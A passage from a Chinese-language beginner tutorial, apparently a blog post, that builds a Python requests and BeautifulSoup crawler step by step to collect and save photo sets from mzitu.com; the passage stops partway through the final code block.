                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161022200031.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161022200031.png" alt="QQ图片20161022200031"></a> 大概界面就是上面的样子了。其余类似安装即可，好啦 下面开始正题了 首先我们打开 PyCharm 新建一个 Python 文件，写入以下代码（喂喂！不要复制哦 自己敲一遍 印象更佳啦。）</p>
                  <figure class="highlight clean">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests ##导入requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup ##导入bs4中的BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>好啦！准备工作完了、 我们来开始让妹子到碗里来吧ヽ(●-`Д´-)ノ 一个简单爬虫的诞生大慨需要下面几个步骤。（我知道图很简陋、请务必不要吐槽） <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ20161029-1.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ20161029-1-1024x354.png" alt="QQ20161029-1"></a></p>
                  <ul>
                    <li>爬虫入口：顾名思义我需要程序从什么地方开始获取网页</li>
                    <li>存储数据：如果获取的网页有你需要的内容则取出数据保存</li>
                    <li>找到资料所在的地址：如果你你获取到的网页没有你需要的数据、但是有前往该数据页面的地址 URL、则获取这个地址 URL，再获取该 URL 的页面内容（也就等于当作爬虫入口了）</li>
                  </ul>
                  <p>好啦！图很简陋、将就着看看，现在来开始看看网页找一个爬虫入口（开始爬取的页面） <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161023150410.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161023150410-1024x537.png" alt="QQ截图20161023150410"></a> 良心站长啊！居然有一个页面有整站所有的数据地址是<strong><a href="http://www.mzitu.com/all" target="_blank" rel="noopener">http://www.mzitu.com/all</a></strong> 我们就以这个页面开始爬取（PS：真良心站长） 下面是我们的第一段代码：用作获取<a href="http://www.mzitu.com/all这个页面。" target="_blank" rel="noopener">http://www.mzitu.com/all这个页面。</a></p>
                  <figure class="highlight clean">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests ##导入requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup ##导入bs4中的BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>&#125;##浏览器请求头（大部分网站没有这个请求头会报错、请务必加上哦）</span><br><span class="line">all_url = <span class="string">'http://www.mzitu.com/all'</span>  ##开始的URL地址</span><br><span class="line">start_html = requests.get(all_url,  headers=headers)  ##使用requests中的get方法来获取all_url(就是：http:<span class="comment">//www.mzitu.com/all这个地址)的内容 headers为上面设置的请求头、请务必参考requests官方文档解释</span></span><br><span class="line">print(start_html.text) ##打印出start_html (请注意，concent是二进制的数据，一般用于下载图片、视频、音频、等多媒体内容是才使用concent, 对于打印网页内容请使用text)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>PS: 如果对 requests.get(all_url, headers=headers)感到不解的各位，请务必去再看一遍官方文档哦（解释得很清楚呢） 你在你的 IDE 中运行的时候会打印出下面的内容： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161024203912.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161024203912-1024x559.png" alt="QQ截图20161024203912"></a> 第一段部分完成啦！！是不感觉超简单！！！！看懂没？没看懂继续瞅瞅、对于看懂的各位小哥儿（妹儿）我只想说··· 小哥儿（妹儿）！你老牛逼了！！ 没看懂？报错？没关系！看见屏幕右边那个群号没？加它！热心的群友会为你耐心解答滴············ 好啦！第一部分获取网页的部分完成啦！我们来开始第二部分提取我们想要的内容吧！！ 在 Chrome 中打开我们第一部分请求的网址：<a href="http://www.mzitu.com/all" target="_blank" rel="noopener">http://www.mzitu.com/all</a> 、 按下 F12 调出 Chrome 的开发者调试工具（不熟练的同学一定要去了解一下哦！爬虫中绝大部分工作要靠这个来完成呢！是必备技能哦！） 是这样： <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161024205256.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161024205256-1024x559.png" alt="QQ截图20161024205256"></a> 看见图中那句话没？没看见？仔细看看那可是我们必须要使用的工具哦！！好啦下面我们看看使用方法 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161025222942.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161025222942-1024x559.png" alt="QQ图片20161025222942"></a> 好啦、我们就是通过这种方法来找到我们需要的数据在那一个标签里面的、方便后面提取出来啦！（实例很简陋 看不懂的童鞋百度一下啦！教程很多的） 你会发现这个页面并没有我们需要的图片地址啊！没有那么怎么办呢？上面那张超级简陋的流程图看了嘛？没看？赶快去瞅瞅·· 你就知道我们该干啥啦！ 嗯，我们需要找到图片地址所在的页面！ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161025224053.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161025224053-1024x615.png" alt="QQ截图20161025224053"></a> 观察一下网页你会发现图片页面的地址全部都在<li>...</li>标签中、（讲真！这么良心，还这么有规律的网页不多了啊！）不信啊?你展开<li>标签瞅瞅就知道啦 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161025224601.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161025224601-1024x604.png" alt="QQ截图20161025224601"></a> 点开
                    <li>标签你会发现图片<strong>页面的地址</strong>在<a>标签的 href 属性中、<strong>主题</strong>在<a>标签中（搞不清楚的这两个的区别的同学、去了解一下 html 的基础啦！） 实现逻辑就是：先找到页面中的全部
                    <li>标签、然后提取出中间<a>标签的 href 属性值与<a>标签的类容，前者我们用来继续请求 html 看看会不会有我们需要的图片下载地址，后者我们存储的时候给文件夹命名使用。 可能有小哥儿（妹儿）会问，为什么不直接查找<a>标签？ 你观察一下网页就知道呐！还有其他地方使用了<a>标签，如果直接查找<a>标签就会多出很多我们不需要的东西，也不方便我们提取想要的东西，先查找
                    <li>标签就是限制一下<a>标签的范围啦！ 通过上面的方法、知道了需要的数据的位置！该我们的<strong>beautifulsoup</strong>来大展身手啦！！！加上上面的一段代码现在应该是这样的啦！看不懂？没关系 看注释 看注释。
                  </p>
                  <figure class="highlight clean">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests ##导入requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup ##导入bs4中的BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>&#125;##浏览器请求头（大部分网站没有这个请求头会报错、请务必加上哦）</span><br><span class="line">all_url = <span class="string">'http://www.mzitu.com/all'</span>  ##开始的URL地址</span><br><span class="line">start_html = requests.get(all_url,  headers=headers)  ##使用requests中的get方法来获取all_url(就是：http:<span class="comment">//www.mzitu.com/all这个地址)的内容 headers为上面设置的请求头、请务必参考requests官方文档解释</span></span><br><span class="line">#print(start_html.text) ##打印出start_html (请注意，concent是二进制的数据，一般用于下载图片、视频、音频、等多媒体内容是才使用concent, 对于打印网页内容请使用text)</span><br><span class="line">Soup = BeautifulSoup(start_html.text, <span class="string">'lxml'</span>) ##使用BeautifulSoup来解析我们获取到的网页（‘lxml’是指定的解析器 具体请参考官方文档哦）</span><br><span class="line">li_list = Soup.find_all(<span class="string">'li'</span>) ##使用BeautifulSoup解析网页过后就可以用找标签呐！（find_all是查找指定网页内的所有标签的意思，find_all返回的是一个列表。）</span><br><span class="line">for li <span class="keyword">in</span> li_list: ##这个不解释了。看不懂的小哥儿回去瞅瞅基础教程</span><br><span class="line">    print(li) ##同上</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行一下试试！ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028113340.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028113340-1024x341.png" alt="QQ截图20161028113340"></a> 诶！！！不对啊！！抓到了我们不需要的东西啊！！！这可怎么办啊！！ 别急 别急！我们再去看看网页的 F12 瞅瞅。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028113957.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028113957-1024x392.png" alt="QQ截图20161028113957"></a> 找到啦！原来有其他地方有<li>标签、观察不仔细啦！现在我们怎么办？ 我们再去 F12 瞅瞅！ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028114348.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028114348-1024x454.png" alt="QQ截图20161028114348"></a> 哈哈！这就简单了，我们推翻上面的思路 现在我们先找到 <div class="all">这个标签 ， 然后直接找<a>标签！ 诶！不对啊！怎么直接找<a>标签了！上面的
                    <li>标签呢！！ 你仔细瞅瞅网页！在<div class="all"></div> 这个模块里面的<a>标签的全是我们需要的东西，就不需要
                    <li>标签来限制提取范围啦！所以就直接扔掉了不用了。也方便写代码啊。 现在我们改改上面的代码！
                  </p>
                  <figure class="highlight clean">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests ##导入requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup ##导入bs4中的BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>&#125;##浏览器请求头（大部分网站没有这个请求头会报错、请务必加上哦）</span><br><span class="line">all_url = <span class="string">'http://www.mzitu.com/all'</span>  ##开始的URL地址</span><br><span class="line">start_html = requests.get(all_url,  headers=headers)  ##使用requests中的get方法来获取all_url(就是：http:<span class="comment">//www.mzitu.com/all这个地址)的内容 headers为上面设置的请求头、请务必参考requests官方文档解释</span></span><br><span class="line">#print(start_html.text) ##打印出start_html (请注意，concent是二进制的数据，一般用于下载图片、视频、音频、等多媒体内容是才使用concent, 对于打印网页内容请使用text)</span><br><span class="line">Soup = BeautifulSoup(start_html.text, <span class="string">'lxml'</span>) ##使用BeautifulSoup来解析我们获取到的网页（‘lxml’是指定的解析器 具体请参考官方文档哦）</span><br><span class="line">#li_list = Soup.find_all(<span class="string">'li'</span>) ##使用BeautifulSoup解析网页过后就可以用找标签呐！（find_all是查找指定网页内的所有标签的意思，find_all返回的是一个列表。）</span><br><span class="line">#for li <span class="keyword">in</span> li_list: ##这个不解释了。看不懂的效小哥儿回去瞅瞅基础教程</span><br><span class="line">    #print(li) ##同上</span><br><span class="line">all_a = Soup.find(<span class="string">'div'</span>, class_=<span class="string">'all'</span>).find_all(<span class="string">'a'</span>) ##意思是先查找 <span class="keyword">class</span>为 all 的div标签，然后查找所有的&lt;a&gt;标签。</span><br><span class="line">for a <span class="keyword">in</span> all_a:</span><br><span class="line">    print(a)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p><strong>PS: ‘find’ 只查找给定的标签一次，就算后面还有一样的标签也不会提取出来哦！ 而 ‘find_all’ 是在页面中找出所有给定的标签！有十个给定的标签就返回十个（返回的是个 list 哦！！）,想要了解得更详细，就是看看官方文档吧！</strong> 来看看运行结果！ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028150438.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028150438.png" alt="QQ截图20161028150438"></a> 哇哦！！全是我们需要的类容诶！什么？你的和这个不一样？或者报错了？回头看看 你做的和我有什么不一样······ 实在不行，群里求助吧！ 好啦！现在我们该来提取我们想要的内容了！又该我们 BeautifulSoup 大展身手了。 我们需要提取出<a>标签的 href 属性和文本。怎么做呢？看代码!</p>
                  <figure class="highlight clean">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests ##导入requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup ##导入bs4中的BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>&#125;##浏览器请求头（大部分网站没有这个请求头会报错、请务必加上哦）</span><br><span class="line">all_url = <span class="string">'http://www.mzitu.com/all'</span>  ##开始的URL地址</span><br><span class="line">start_html = requests.get(all_url,  headers=headers)  ##使用requests中的get方法来获取all_url(就是：http:<span class="comment">//www.mzitu.com/all这个地址)的内容 headers为上面设置的请求头、请务必参考requests官方文档解释</span></span><br><span class="line">#print(start_html.text) ##打印出start_html (请注意，concent是二进制的数据，一般用于下载图片、视频、音频、等多媒体内容是才使用concent, 对于打印网页内容请使用text)</span><br><span class="line">Soup = BeautifulSoup(start_html.text, <span class="string">'lxml'</span>) ##使用BeautifulSoup来解析我们获取到的网页（‘lxml’是指定的解析器 具体请参考官方文档哦）</span><br><span class="line">#li_list = Soup.find_all(<span class="string">'li'</span>) ##使用BeautifulSoup解析网页过后就可以用找标签呐！（find_all是查找指定网页内的所有标签的意思，find_all返回的是一个列表。）</span><br><span class="line">#for li <span class="keyword">in</span> li_list: ##这个不解释了。看不懂的效小哥儿回去瞅瞅基础教程</span><br><span class="line">    #print(li) ##同上</span><br><span class="line">all_a = Soup.find(<span class="string">'div'</span>, class_=<span class="string">'all'</span>).find_all(<span class="string">'a'</span>) ##意思是先查找 <span class="keyword">class</span>为 all 的div标签，然后查找所有的&lt;a&gt;标签。</span><br><span class="line"># 页面更改 多了一个早期图片 需要删掉（小伙伴们 可以自己尝试处理一下这个页面）</span><br><span class="line">all_a.pop(<span class="number">0</span>)</span><br><span class="line"># 上面是删掉列表的第一个元素</span><br><span class="line">for a <span class="keyword">in</span> all_a:</span><br><span class="line">    title = a.get_text() #取出a标签的文本</span><br><span class="line">    href = a[<span class="string">'href'</span>] #取出a标签的href 属性</span><br><span class="line">    print(title, href)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>就多了两行！很方便吧！！为什么这么写？自己去看官方文档啦！（我要全解释了，估计有些小哥儿官方文档都不会去看。这样很不好诶。） 来来！看看结果怎么样 我们来打印一下看看！ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028152315.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028152315.png" alt="QQ截图20161028152315"></a> 哈哈 果然是我们想要的内容！我们已经找向目标前进了一半了！好啦前面已经把怎么实现的方法讲清楚了哦（如果你觉得什么地方有问题或者不清楚，在群里说说 我好改改）下面就要开始加快节奏了！！（篇幅长了 会被人骂的！） 上面我们找到了 图片的标题（暂时不管，这是后面用来创建文件夹的）和 图片页面的地址（这是我们这一步需要做的），需要做什么请参考最上面那个超简陋的流程图。 先查看一下图片页面有什么东西 你会发现一个页面只有一张图片啊！想要下载一套啊！ 你点一下面的 1 、2、3、4········ 你会发现地址栏里面的 URL 在变化啊！这就是我们的入手的地方了！ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028164035.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028164035-1024x580.png" alt="QQ截图20161028164035"></a> 页码在<span>标签中，我们只需要获取最后一个页面的页码， 从 1 开始历遍，和我们上面获取的 URL 拼接在一起就是每张图片的页面地址啦！ 在页面的源代码搜一下<span>标签 [![QQ截图20161028191747](http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028191747-1024x554.png)](http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028191747.png) 可以发现最后一个页面的<span>标签是第二十一个标签，因为在 html 中标签是成对的，所以我需要查找的是第十一个<span>标签（BeautifulSoup 是以开始的标签定位，而不是结尾的。开始的标签是这样<>；结束的标签是这样</>） 废话不多说上代码！ <strong>PS：下面的代码我已经把注释掉的删掉了，所以看起来和上面的不太一样。</strong></p>
                  <figure class="highlight clean">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests ##导入requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup ##导入bs4中的BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>&#125;##浏览器请求头（大部分网站没有这个请求头会报错、请务必加上哦）</span><br><span class="line">all_url = <span class="string">'http://www.mzitu.com/all'</span>  ##开始的URL地址</span><br><span class="line">start_html = requests.get(all_url,  headers=headers)  ##使用requests中的get方法来获取all_url(就是：http:<span class="comment">//www.mzitu.com/all这个地址)的内容 headers为上面设置的请求头、请务必参考requests官方文档解释</span></span><br><span class="line">Soup = BeautifulSoup(start_html.text, <span class="string">'lxml'</span>) ##使用BeautifulSoup来解析我们获取到的网页（‘lxml’是指定的解析器 具体请参考官方文档哦）</span><br><span class="line">all_a = Soup.find(<span class="string">'div'</span>, class_=<span class="string">'all'</span>).find_all(<span class="string">'a'</span>) ##意思是先查找 <span class="keyword">class</span>为 all 的div标签，然后查找所有的&lt;a&gt;标签。</span><br><span class="line"># 页面更改 多了一个早期图片 需要删掉（小伙伴们 可以自己尝试处理一下这个页面）</span><br><span class="line">all_a.pop(<span class="number">0</span>)</span><br><span class="line"># 上面是删掉列表的第一个元素</span><br><span class="line">for a <span class="keyword">in</span> all_a:</span><br><span class="line">    title = a.get_text() #取出a标签的文本</span><br><span class="line">    href = a[<span class="string">'href'</span>] #取出a标签的href 属性</span><br><span class="line">    html = requests.get(href, headers=headers) ##上面说过了</span><br><span class="line">    html_Soup = BeautifulSoup(html.text, <span class="string">'lxml'</span>) ##上面说过了</span><br><span class="line">    max_span = html_Soup.find(<span class="string">'div'</span>, class_=<span class="string">'pagenavi'</span>).find_all(<span class="string">'span'</span>)[<span class="number">-2</span>].get_text() ##查找所有的&lt;span&gt;标签获取第十个的&lt;span&gt;标签中的文本也就是最后一个页面了。</span><br><span class="line">    for page <span class="keyword">in</span> range(<span class="number">1</span>, int(max_span)+<span class="number">1</span>): ##不知道为什么这么用的小哥儿去看看基础教程吧</span><br><span class="line">        page_url = href + <span class="string">'/'</span> + str(page) ##同上</span><br><span class="line">        print(page_url) ##这个page_url就是每张图片的页面地址啦！但还不是实际地址！</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>好啦！运行一下试试！就是下面这样: <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028194230.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028194230.png" alt="QQ截图20161028194230"></a> 完美！！每个页面的地址都出来啦！！！ 下面开始找图片的实际地址啦！ 随意打开上面的地址地用 F12 调试工具试试！ <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028195338.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028195338-1024x405.png" alt="QQ截图20161028195338"></a> 会发现我们需要的地址在
                  <div class="main-image">中的<img>标签的 src 属性中。是不是很眼熟啊！知道怎么写了吧？下面上代码：</p>
                    <figure class="highlight clean">
                      <table>
                        <tr>
                          <td class="gutter">
                            <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre>
                          </td>
                          <td class="code">
                            <pre><span class="line"><span class="keyword">import</span> requests ##导入requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup ##导入bs4中的BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>&#125;##浏览器请求头（大部分网站没有这个请求头会报错、请务必加上哦）</span><br><span class="line">all_url = <span class="string">'http://www.mzitu.com/all'</span>  ##开始的URL地址</span><br><span class="line">start_html = requests.get(all_url,  headers=headers)  ##使用requests中的get方法来获取all_url(就是：http:<span class="comment">//www.mzitu.com/all这个地址)的内容 headers为上面设置的请求头、请务必参考requests官方文档解释</span></span><br><span class="line">Soup = BeautifulSoup(start_html.text, <span class="string">'lxml'</span>) ##使用BeautifulSoup来解析我们获取到的网页（‘lxml’是指定的解析器 具体请参考官方文档哦）</span><br><span class="line">all_a = Soup.find(<span class="string">'div'</span>, class_=<span class="string">'all'</span>).find_all(<span class="string">'a'</span>) ##意思是先查找 <span class="keyword">class</span>为 all 的div标签，然后查找所有的&lt;a&gt;标签。</span><br><span class="line"># 页面更改 多了一个早期图片 需要删掉（小伙伴们 可以自己尝试处理一下这个页面）</span><br><span class="line">all_a.pop(<span class="number">0</span>)</span><br><span class="line"># 上面是删掉列表的第一个元素</span><br><span class="line">for a <span class="keyword">in</span> all_a:</span><br><span class="line">    title = a.get_text() #取出a标签的文本</span><br><span class="line">    href = a[<span class="string">'href'</span>] #取出a标签的href 属性</span><br><span class="line">    html = requests.get(href, headers=headers) ##上面说过了</span><br><span class="line">    html_Soup = BeautifulSoup(html.text, <span class="string">'lxml'</span>) ##上面说过了</span><br><span class="line">    max_span = html_Soup.find(<span class="string">'div'</span>, <span class="keyword">class</span>=<span class="string">'pagenavi'</span>).find_all(<span class="string">'span'</span>)[<span class="number">-2</span>].get_text() ##查找所有的&lt;span&gt;标签获取第十个的&lt;span&gt;标签中的文本也就是最后一个页面了。</span><br><span class="line">    for page <span class="keyword">in</span> range(<span class="number">1</span>, int(max_span)+<span class="number">1</span>): ##不知道为什么这么用的小哥儿去看看基础教程吧</span><br><span class="line">        page_url = href + <span class="string">'/'</span> + str(page) ##同上</span><br><span class="line">        img_html = requests.get(page_url, headers=headers)</span><br><span class="line">        img_Soup = BeautifulSoup(img_html.text, <span class="string">'lxml'</span>)</span><br><span class="line">        img_url = img_Soup.find(<span class="string">'div'</span>, class_=<span class="string">'main-image'</span>).find(<span class="string">'img'</span>)[<span class="string">'src'</span>] ##这三行上面都说过啦不解释了哦</span><br><span class="line">        print(img_url)</span><br></pre>
                          </td>
                        </tr>
                      </table>
                    </figure>
                    <p>运行一下 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028200330.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ截图20161028200330.png" alt="QQ截图20161028200330"></a> 完美！就是我们想要的东西，下面开始保存了哦！哈哈！妹子马上就可以到你碗里去了！ 首先我们要给每套图建一个文件夹，然后将下载的图片以 URL 的 xxxxx.jpg 中的 xxxxx 命名保存在这个文件夹里面。直接上代码了！</p>
                    <figure class="highlight clean">
                      <table>
                        <tr>
                          <td class="gutter">
                            <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre>
                          </td>
                          <td class="code">
                            <pre><span class="line"><span class="keyword">import</span> requests ##导入requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup ##导入bs4中的BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span>&#125;##浏览器请求头（大部分网站没有这个请求头会报错、请务必加上哦）</span><br><span class="line">all_url = <span class="string">'http://www.mzitu.com/all'</span>  ##开始的URL地址</span><br><span class="line">start_html = requests.get(all_url,  headers=headers)  ##使用requests中的get方法来获取all_url(就是：http:<span class="comment">//www.mzitu.com/all这个地址)的内容 headers为上面设置的请求头、请务必参考requests官方文档解释</span></span><br><span class="line">Soup = BeautifulSoup(start_html.text, <span class="string">'lxml'</span>) ##使用BeautifulSoup来解析我们获取到的网页（‘lxml’是指定的解析器 具体请参考官方文档哦）</span><br><span class="line">all_a = Soup.find(<span class="string">'div'</span>, class_=<span class="string">'all'</span>).find_all(<span class="string">'a'</span>) ##意思是先查找 <span class="keyword">class</span>为 all 的div标签，然后查找所有的&lt;a&gt;标签。</span><br><span class="line"># 页面更改 多了一个早期图片 需要删掉（小伙伴们 可以自己尝试处理一下这个页面）</span><br><span class="line">all_a.pop(<span class="number">0</span>)</span><br><span class="line"># 上面是删掉列表的第一个元素</span><br><span class="line">for a <span class="keyword">in</span> all_a:</span><br><span class="line">    title = a.get_text() #取出a标签的文本</span><br><span class="line">    path = str(title).strip() ##去掉空格</span><br><span class="line">    os.makedirs(os.path.join(<span class="string">"D:\mzitu"</span>, path)) ##创建一个存放套图的文件夹</span><br><span class="line">    os.chdir(<span 